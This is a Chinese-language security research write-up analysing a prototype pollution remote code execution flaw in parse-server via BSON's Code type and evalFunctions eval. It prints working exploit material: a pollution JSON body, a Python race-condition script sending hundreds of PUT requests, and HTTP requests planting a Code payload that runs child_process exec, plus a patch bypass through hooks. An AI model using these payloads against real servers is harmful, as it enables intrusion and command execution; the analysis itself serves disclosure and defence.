**作者：billion@知道创宇404实验室  
时间：2023年3月31日**

parse-server公布了一个原型污染的RCE漏洞，看起来同mongodb有关联，so跟进&&分析一下。

## BSON潜在问题

parse-server使用的mongodb依赖包版本是3.6.11，在`node-mongodb-drive <= 3.7.3`
版本时，使用1.x版本的bson依赖处理数据。

根据BSON文档的介绍，存在一种Code类型，可以在反序列化时被执行

![](https://images.seebug.org/content/images/2023/03/31/1680248406000-10.png-w331s)

跟进BSON的序列化过程

    
    
          } else if (value['_bsontype'] === 'Code') {
            index = serializeCode(
              buffer,
              key,
              value,
              index,
              checkKeys,
              depth,
              serializeFunctions,
              ignoreUndefined
            );

当对象的`_bsontype`键为`Code`时，就会被判断为Code类型，后面就会调用serializeCode函数进行序列化。

在反序列化时，遇到Code类型，会进行eval操作

    
    
    var isolateEval = function(functionString) {
      // Contains the value we are going to set
      var value = null;
      // Eval the function
      eval('value = ' + functionString);
      return value;
    };

根据官方的文档，可以了解到这本身就是bson内置的功能，不过需要打开evalFunctions参数

翻翻源码可以看到

    
    
    var deserializeObject = function(buffer, index, options, isArray) {
      var evalFunctions = options['evalFunctions'] == null ? false : options['evalFunctions'];
      var cacheFunctions = options['cacheFunctions'] == null ? false : options['cacheFunctions'];
      var cacheFunctionsCrc32 =
        options['cacheFunctionsCrc32'] == null ? false : options['cacheFunctionsCrc32'];

`evalFunctions`参数默认情况下是未定义的，所以可以用原型污染来利用，该特性可以一直利用到bson <= 4.1.0

## Code上传点

mongodb在处理文件时，采用了一种叫[GridFS](https://www.mongodb.com/docs/drivers/node/current/fundamentals/gridfs/#how-gridfs-works)的东西

![](https://images.seebug.org/content/images/2023/03/31/1680248406000-1.png-w331s)

看图大致可以了解到GridFS在存储文件时，把元数据(metadata)放到`fs.files`表，把文件内容放到`fs.chunks`表

跟进parse-server的源码，可以找到处理metadata的过程

**node_modules/parse-server/lib/Routers/FilesRouter.js**

![](https://images.seebug.org/content/images/2023/03/31/1680248407000-6.png-w331s)

**node_modules/parse-server/lib/Adapters/Files/GridFSBucketAdapter.js**

![](https://images.seebug.org/content/images/2023/03/31/1680248407000-7.png-w331s)

输入进来的metadata被直接传入到了数据库中，并没有进行过滤

在测试的时候，发现metadata并没有保存到数据库中

![](https://images.seebug.org/content/images/2023/03/31/1680248407000-9.png-w331s)

排查了一下middleware，可以找到以下验证

**node_modules/parse-server/lib/middlewares.js**

只有当`fileViaJSON=true`时，才会把fileData拷贝过去

    
    
      if (fileViaJSON) {
        req.fileData = req.body.fileData; // We need to repopulate req.body with a buffer
        var base64 = req.body.base64;
        req.body = Buffer.from(base64, 'base64');
      }

回溯一下

    
    
      var fileViaJSON = false;
    
      if (!info.appId || !_cache.default.get(info.appId)) {
        // See if we can find the app id on the body.
        if (req.body instanceof Buffer) {
    
          try {
            req.body = JSON.parse(req.body);
          } catch (e) {
            return invalidRequest(req, res);
          }
    
          fileViaJSON = true;
        }

当info.appId没有设置的话，就会进入if，fileViaJSON就被设置为true；或者是缓存中没有info.appId的信息

    
    
    function handleParseHeaders(req, res, next) {
      var mount = getMountForRequest(req);
      var info = {
        appId: req.get('X-Parse-Application-Id'),

向上翻翻代码，就可以看到appId的赋值

后面还会有一处校验

    
    
    if (req.body && req.body._ApplicationId && _cache.default.get(req.body._ApplicationId) && (!info.masterKey || _cache.default.get(req.body._ApplicationId).masterKey === info.masterKey)) {
          info.appId = req.body._ApplicationId;
          info.javascriptKey = req.body._JavaScriptKey || '';
    
        } else {
          return invalidRequest(req, res);
        }

这一步需要保证`_ApplicationId`是正确的appId，否则就退出了

所以认证这里有两种构造方式

**No.1**

让请求头中的`X-Parse-Application-Id`是一个不存在的appid，然后修改body中的`_ApplicationId`是正确的appid

![](https://images.seebug.org/content/images/2023/03/31/1680248407000-2.png-w331s)

在fs.files表中也能够看到上传的metadata信息

![](https://images.seebug.org/content/images/2023/03/31/1680248407000-3.png-w331s)

现在Code类型已经上传了，所以在找到一处原型污染，就可以RCE了

**No.2**

不设置`X-Parse-Application-Id`请求头

![](https://images.seebug.org/content/images/2023/03/31/1680248407000-5.png-w331s)

结果

![](https://images.seebug.org/content/images/2023/03/31/1680248407000-4.png-w331s)

## 原型污染

根据官方公告，应该在mongo目录下有原型污染，大致上过了一遍代码，感觉下面这一部分可能有

    
    
      for (var restKey in restUpdate) {
        if (restUpdate[restKey] && restUpdate[restKey].__type === 'Relation') {
          continue;
        }
    
        var out = transformKeyValueForUpdate(className, restKey, restUpdate[restKey], parseFormatSchema); // If the output value is an object with any $ keys, it's an
        // operator that needs to be lifted onto the top level update
        // object.
    
        if (typeof out.value === 'object' && out.value !== null && out.value.__op) {
          mongoUpdate[out.value.__op] = mongoUpdate[out.value.__op] || {};
          mongoUpdate[out.value.__op][out.key] = out.value.arg;
        } else {
          mongoUpdate['$set'] = mongoUpdate['$set'] || {};
          mongoUpdate['$set'][out.key] = out.value;
        }
      }

如果能控制`out.value.__op` `out.key` `out.value.arg`，那就可以污染原型的`evalFunctions`了

回溯变量，跟进`transformKeyValueForUpdate()`函数

    
    
    const transformKeyValueForUpdate = (className, restKey, restValue, parseFormatSchema) => {
      // Check if the schema is known since it's a built-in field.
      var key = restKey;
      var timeField = false;
    
      switch (key) {
        case 'objectId':
        case '_id':
          if (['_GlobalConfig', '_GraphQLConfig'].includes(className)) {
            return {
              key: key,
              value: parseInt(restValue)
            };
          }
    
          key = '_id';
          break;
    
        case 'createdAt':
        case '_created_at':
          key = '_created_at';
          timeField = true;
          break;
    
        case 'updatedAt':
        case '_updated_at':
          key = '_updated_at';
          timeField = true;
          break;
    
        case 'sessionToken':
        case '_session_token':
          key = '_session_token';
          break;
    
        case 'expiresAt':
        case '_expiresAt':
          key = 'expiresAt';
          timeField = true;
          break;
    ........
        case '_rperm':
        case '_wperm':
          return {
            key: key,
            value: restValue
          };
    ......
      }

返回值大都是`{key, value}`的形式，如果key是case中的任一个，那必然不可能返回`__proto__`，继续看后面的部分

    
    
    if (parseFormatSchema.fields[key] && parseFormatSchema.fields[key].type === 'Pointer' || !parseFormatSchema.fields[key] && restValue && restValue.__type == 'Pointer') {
        key = '_p_' + key;
      } // Handle atomic values
    
    
      var value = transformTopLevelAtom(restValue);
    
      if (value !== CannotTransform) {
        if (timeField && typeof value === 'string') {
          value = new Date(value);
        }
    
        if (restKey.indexOf('.') > 0) {
          return {
            key,
            value: restValue
          };
        }
    
        return {//这里
          key,
          value
        };
      } // Handle arrays

在最终污染的位置`restKey`应该是`evalFunctions`，所以不会进入`if (restKey.indexOf('.') > 0)
{`这个分支，可以通过第二个`return`返回key和value

跟进`transformTopLevelAtom()`函数

    
    
    function transformTopLevelAtom(atom, field) {
      switch (typeof atom) {
    .......
        case 'object':
          if (atom instanceof Date) {
            // Technically dates are not rest format, but, it seems pretty
            // clear what they should be transformed to, so let's just do it.
            return atom;
          }
    
          if (atom === null) {
            return atom;
          } // TODO: check validity harder for the __type-defined types
    
    
          if (atom.__type == 'Pointer') {
            return `${atom.className}$${atom.objectId}`;
          }
    
          if (DateCoder.isValidJSON(atom)) {
            return DateCoder.JSONToDatabase(atom);
          }
    
          if (BytesCoder.isValidJSON(atom)) {
            return BytesCoder.JSONToDatabase(atom);
          }
    
          if (GeoPointCoder.isValidJSON(atom)) {
            return GeoPointCoder.JSONToDatabase(atom);
          }
    
          if (PolygonCoder.isValidJSON(atom)) {
            return PolygonCoder.JSONToDatabase(atom);
          }
    
          if (FileCoder.isValidJSON(atom)) {
            return FileCoder.JSONToDatabase(atom);
          }
    
          return CannotTransform;
    
        default:
          // I don't think typeof can ever let us get here
          throw new Parse.Error(Parse.Error.INTERNAL_SERVER_ERROR, `really did not expect value: ${atom}`);
      }
    }

只需要让函数在前面的`if`中返回，就可以让`value!==CannotTransform`

挑一个`FileCoder`

    
    
    var FileCoder = {
      databaseToJSON(object) {
        return {
          __type: 'File',
          name: object
        };
      },
    
      isValidDatabaseObject(object) {
        return typeof object === 'string';
      },
    
      JSONToDatabase(json) {
        return json.name;
      },
    
      isValidJSON(value) {
        return typeof value === 'object' && value !== null && value.__type === 'File';
      }
    
    };

汇总变量的变化，可以得到`restUpdate`的形式应该是下面这样

    
    
    {
    "evalFunctions":{
        "__type":"File",
        "name":{
                "__op": "__proto__",
            "arg": true
        }
        }
    }

在找了好久之后，大概发现下面这样一条调用链

    
    
    node_modules/parse-server/lib/Adapters/Storage/Mongo/MongoTransform.js transformUpdate()
    node_modules/parse-server/lib/Adapters/Storage/Mongo/MongoStorageAdapter.js updateObjectsByQuery()
    node_modules/parse-server/lib/Controllers/DatabaseController.js update()
    node_modules/parse-server/lib/RestWrite.js  runBeforeSaveTrigger()
    node_modules/parse-server/lib/RestWrite.js  execute()
    node_modules/parse-server/lib/RestWrite.js  new RestWrite()
    node_modules/parse-server/lib/rest.js update()
    node_modules/parse-server/lib/Routers/ClassesRouter.js  handleUpdate()

在update之前，需要先创建一条数据

![](https://images.seebug.org/content/images/2023/03/31/1680248408000-11.png-w331s)

触发update

![](https://images.seebug.org/content/images/2023/03/31/1680248408000-12.png-w331s)

修改成`restUpdate`，debug看看流程对不对

![](https://images.seebug.org/content/images/2023/03/31/1680248408000-13.png-w331s)

跟进代码可以发现，parse-server会对修改之后的类型做判断，上传的是一个Object类型，修改的是File类型，两者不匹配，所以就退出了。并且update包的类型是根据`__type`和`name`来的

![](https://images.seebug.org/content/images/2023/03/31/1680248408000-14.png-w331s)

不是很好绕过。只能在create包上做修改

通过调试代码发现，create包也会经过同样的类型判断过程，所以只需要把update包，复制一份到create中就好了

create包

![](https://images.seebug.org/content/images/2023/03/31/1680248408000-15.png-w331s)

update包

![](https://images.seebug.org/content/images/2023/03/31/1680248408000-16.png-w331s)

服务端报错信息，应该可以确定，evalFunctions已经污染上了

![](https://images.seebug.org/content/images/2023/03/31/1680248409000-17.png-w331s)

为了保证不会因为服务端的报错，导致异常退出，这里用条件竞争来做

    
    
    def triger_unserialize(item):
        if item !=400:
            requests.get(
                url = file_path
            )
        r3 = requests.put(
            url = url + f"/parse/classes/{path}/{objectId}",
            data = json.dumps({
                "evalFunctions":{
                    "__type":"File",
                    "name":{
                        "__op":"__proto__",
                        "arg":"1"
                    }
                },
                "cheatMode":"false"
            }),
            headers = {
                "X-Parse-Application-Id":f"{appid}",
                'Content-Type': 'application/json'
            }
        )
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
        futures = [executor.submit(triger_unserialize, item) for item in range(0,800)]

## 修复绕过

官方的修复措施是对metadata进行过滤，但是没有修复原型污染，所以，找一个新的可以上传Code类型的位置，就可以RCE

Hooks

创建hook函数

    
    
    POST /parse/hooks/triggers HTTP/1.1
    Host: ip:port
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
    Accept: */*
    Content-Type: application/json
    Content-Length: 254
    Connection: close
    
    {
    "_ApplicationId":"123",
    "className":"cname",
    "triggerName":"tname",
    "url":{
    "_bsontype":"Code",
    "code":"delete ({}).__proto__.evalFunctions; require(`child_process`).exec('touch /tmp/123.txt')"
    },
    "functionName":"f34",
    "_MasterKey":"123456"
    }

触发

    
    
    GET /parse/hooks/functions/f34 HTTP/1.1
    Host: ip:port
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
    Accept: */*
    Content-Length: 52
    Content-Type: application/json
    Connection: close
    
    {
    "_ApplicationId":"123",
    "_MasterKey":"123456"
    }

这种方式得知道MasterKey才能利用，还是有些限制的

在最新版(6.0.0)测试的时候发现，parse-server在5.1.0版本时，就已经把 node-mongodb-drive的版本换成了4.3.1

![](https://images.seebug.org/content/images/2023/03/31/1680248409000-19.png-w331s)

bson的版本也随之变成了4.6，就没有办法执行eval了

![](https://images.seebug.org/content/images/2023/03/31/1680248409000-18.png-w331s)

bson5.0中直接删除了该eval操作

https://jira.mongodb.org/browse/NODE-4711

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/2059/>

